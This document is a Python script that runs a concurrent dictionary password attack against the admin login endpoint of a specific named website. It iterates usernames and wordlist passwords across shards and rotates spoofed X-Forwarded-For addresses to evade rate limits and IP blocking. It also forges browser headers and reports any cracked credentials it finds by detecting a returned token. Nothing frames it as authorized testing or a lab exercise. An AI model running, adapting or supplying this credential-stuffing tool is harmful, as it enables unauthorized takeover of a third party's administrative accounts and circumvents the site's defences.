import json, random, sys, time, os, urllib.request, urllib.error
import concurrent.futures
from collections import Counter

TARGET = "https://www.kufaka.com/adminApi/auth/login"
DICT = "dict.txt"
USERS = (os.environ.get("USERS") or "admin").split(",")

# args: shard nshards [maxreq]
shard = int(sys.argv[1]) if len(sys.argv) > 1 else 0
nshards = int(sys.argv[2]) if len(sys.argv) > 2 else 1
maxreq = int(sys.argv[3]) if len(sys.argv) > 3 else 100000
CONC = int(os.environ.get("CONC") or "8")

with open(DICT, encoding="utf-8", errors="ignore") as f:
    words = [w.rstrip("\n") for w in f if w.strip()]
# task space = users x words (user-major)
total = len(USERS) * len(words)
per = (total + nshards - 1) // nshards
start = shard * per
end = min(total, start + per)
if start >= total:
    print("SHARD_EMPTY shard=%d total=%d" % (shard, total)); print("RESULT tested=0 hit=0 blocked=0"); sys.exit(0)

def rand_ip():
    return "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255), random.randint(0, 255), random.randint(1, 254))

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"

def attempt(k):
    u = USERS[k // len(words)]
    w = words[k % len(words)]
    body = json.dumps({"username": u, "password": w}).encode()
    req = urllib.request.Request(TARGET, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("X-Forwarded-For", rand_ip())
    req.add_header("User-Agent", UA)
    req.add_header("Referer", "https://www.kufaka.com/package/admin/")
    req.add_header("Origin", "https://www.kufaka.com")
    try:
        r = urllib.request.urlopen(req, timeout=20)
        txt = r.read().decode("utf-8", "ignore")
        return (r.status, txt, k)
    except urllib.error.HTTPError as e:
        try: b = e.read().decode("utf-8", "ignore")[:200]
        except Exception: b = ""
        return (e.code, b, k)
    except Exception as e:
        return (0, "ERR:%s" % type(e).__name__, k)

counts = Counter()
hit = None
blocked_streak = 0
stop = False
tested = 0
idx = start
t0 = time.time()
last_report = t0

# bounded submission with early stop
with concurrent.futures.ThreadPoolExecutor(max_workers=CONC) as ex:
    futs = {}
    k = start
    while k < end and len(futs) < CONC:
        futs[ex.submit(attempt, k)] = k; k += 1
    while futs:
        done, _ = concurrent.futures.wait(futs, return_when=concurrent.futures.FIRST_COMPLETED)
        for fu in done:
            st, txt, kk = fu.result(); del futs[fu]
            if st in (403, 429):
                counts["blocked"] += 1; blocked_streak += 1
            elif st == 200 and "用户名或密码不正确" in txt:
                counts["miss"] += 1; tested += 1; blocked_streak = 0
            elif st == 200:
                counts["ok?"] += 1; tested += 1; blocked_streak = 0
                # candidate hit: anything not the standard miss and not "不能为空"
                if "不能为空" not in txt and "\"token\"" in txt:
                    u = USERS[kk // len(words)]; w = words[kk % len(words)]
                    print("HIT user=%s pass=%s resp=%s" % (u, w, txt[:300]), flush=True)
                    hit = (u, w, txt)
            else:
                counts["other"] += 1; tested += 1; blocked_streak = 0
            if blocked_streak >= 40:
                stop = True
            now = time.time()
            if now - last_report > 30:
                print("[t=%ds] tested=%d blocked=%d lastidx=%d" % (now - t0, tested, counts["blocked"], kk), flush=True)
                last_report = now
        if stop:
            # drain
            for fu in list(futs):
                fu.cancel()
            break
        while not stop and k < end and len(futs) < CONC and (tested + counts["blocked"]) < maxreq:
            futs[ex.submit(attempt, k)] = k; k += 1
        if len(futs) == 0 and (k >= end or (tested + counts["blocked"]) >= maxreq):
            break

dt = time.time() - t0
print("RESULT shard=%d tested=%d blocked=%d other=%s hit=%s elapsed=%.1fs last_idx=%d range=[%d,%d)" % (
    shard, tested, counts["blocked"], dict(counts), bool(hit), dt, k, start, end), flush=True)
